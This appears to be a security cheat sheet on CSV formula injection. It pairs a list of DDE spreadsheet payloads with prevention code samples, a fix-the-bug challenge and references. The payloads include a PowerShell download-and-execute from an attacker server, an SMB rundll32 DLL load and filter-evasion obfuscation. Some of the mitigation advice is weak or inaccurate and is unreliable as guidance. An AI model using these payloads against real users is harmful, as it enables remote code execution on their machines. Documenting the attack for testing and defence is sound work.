# CSV Injection

Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.

## Exploit

Basic exploit with Dynamic Data Exchange

```powershell
# pop a calc
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0

# pop a notepad
=cmd|' /C notepad'!'A1'

# powershell download and execute
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0

# msf smb delivery with rundll32
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1

# Prefix obfuscation and command chaining
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
+thespanishinquisition(cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A

# Using rundll32 instead of cmd
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A

# Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A

```

Technical Details of the above payload:

- `cmd` is the name the server can respond to whenever a client is trying to access the server
- `/C` calc is the file name which in our case is the calc(i.e the calc.exe)
- `!A0` is the item name that specifies unit of data that a server can respond when the client is requesting the data

Any formula can be started with

```powershell
=
+
–
@
```

## Prevention and Best Practices

- **Input Validation:** Validate and sanitize user input before allowing it to be included in CSV files. Proper input validation can prevent malicious data from being injected into the files.
  ```python
    import csv

  def sanitize_input(user_input):
      # Implement your sanitization logic here
      sanitized_input = user_input.replace(',', '').replace('=', '')
      return sanitized_input

  user_data = sanitize_input(user_input)
  with open('data.csv', 'w', newline='') as csvfile:
      csvwriter = csv.writer(csvfile)
      csvwriter.writerow([user_data, 'other_data'])
  ```
- **Output Encoding:** Implement output encoding to ensure that special characters are properly escaped before being included in CSV files. This prevents the execution of malicious commands.
  ```php
    function encode_for_csv($data) {
      return '"' . htmlspecialchars($data, ENT_QUOTES, 'UTF-8') . '"';
  }
  
  $user_data = encode_for_csv($user_input);
  $csv_content = $user_data . ',' . $other_data;
  file_put_contents('data.csv', $csv_content);
  ```
- **Use Prepared Statements:** If interacting with a database, use prepared statements to prevent SQL Injection, which could lead to CSV Injection vulnerabilities.
  ```php
  $stmt = $mysqli->prepare("INSERT INTO table_name (user_data, other_data) VALUES (?, ?)");
  $stmt->bind_param("ss", $user_input, $other_data);
  $stmt->execute();
  ```
- **Content Disposition Headers:** Set Content-Disposition headers with a safe filename when serving CSV files. This helps in preventing browsers from interpreting the CSV files as executable content.
  ```php
  header('Content-Disposition: attachment; filename="safe-file.csv"');
  ```
- **Whitelisting:** Maintain a whitelist of allowed characters and patterns for CSV files. Block any input that does not adhere to these rules.
- **Use Libraries:** Instead of manually generating CSV files, consider using established libraries specific to your programming language/framework. These libraries often handle special characters and encoding issues more effectively.

## Challenge Task
Identify and fix the CSV Injection vulnerability in the following code snippet
```php
$user_input = $_GET['data'];
$csv_content = $user_input . ',other_data';
file_put_contents('data.csv', $csv_content);
```

## References

* [OWASP - CSV Excel Macro Injection](https://owasp.org/www-community/attacks/CSV_Injection)
* [Google Bug Hunter University - CSV Excel formula injection](https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
* [CSV INJECTION: BASIC TO EXPLOIT!!!! - 30/11/2017 - Akansha Kesharwani](https://payatu.com/csv-injection-basic-to-exploit/)
* [From CSV to Meterpreter - 5th November 2015 - Adam Chester](https://blog.xpnsec.com/from-csv-to-meterpreter/)
* [The Absurdly Underestimated Dangers of CSV Injection - 7 October, 2017 - George Mauer](http://georgemauer.net/2017/10/07/csv-injection.html)
* [Three New DDE Obfuscation Methods](https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
* [Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection](https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)

